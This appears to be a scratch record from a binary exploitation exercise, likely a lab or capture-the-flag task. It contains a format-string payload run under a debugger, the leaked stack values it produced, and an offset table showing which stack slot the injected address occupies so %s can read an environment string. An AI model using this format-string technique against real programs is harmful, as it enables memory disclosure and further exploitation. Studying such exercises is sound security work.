r AAAAAAAA..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%s$(printf "\x67\xee\xff\xff\xff\x7f")

AAAAAAAA..0x7fffffffe140..0x8..0x7fffffffee677325..0x7ffff7dd0d80..0x7ffff7dd0d80..0x1..(nil)..0x1..0x7fffffffd7f0..0x7fffffffd7f0..0x100400328..0x4141414141414141..0x70252e2e70252e2e..0x70252e2e70252e2e..0x70252e2e70252e2e..0x70252e2e70252e2e..0x70252e2e70252e2e..0x70252e2e70252e2e..0x70252e2e70252e2e..0x70252e2e70252e2e..0x70252e2e70252e2e..0x70252e2e70252e2e..0x70252e2e70252e2e..0x70252e2e70252e2e..0x73252e2e70252e2e..PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bing����

0  AAAAAAAA
1  ..0x7fffffffe140
2  ..0x8
3  ..0x7fffffffee677325
4  ..0x7ffff7dd0d80
5  ..0x7ffff7dd0d80
6  ..0x1
7  ..(nil)
8  ..0x1
9  ..0x7fffffffd7f0
10 ..0x7fffffffd7f0
11 ..0x100400328
12 ..0x4141414141414141
13 ..0x70252e2e70252e2e (1, 2)
14 ..0x70252e2e70252e2e (3, 4)
15 ..0x70252e2e70252e2e (5, 6)
16 ..0x70252e2e70252e2e (7, 8)
17 ..0x70252e2e70252e2e (9, 10)
18 ..0x70252e2e70252e2e (11, 12)
19 ..0x70252e2e70252e2e (13, 14)
20 ..0x70252e2e70252e2e (15, 16)
21 ..0x70252e2e70252e2e (17, 18)
22 ..0x70252e2e70252e2e (19, 20)
23 ..0x70252e2e70252e2e (21, 22)
24 ..0x70252e2e70252e2e (23, 24)
25 ..0x73252e2e70252e2e (25, 26)
26 ..PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bing����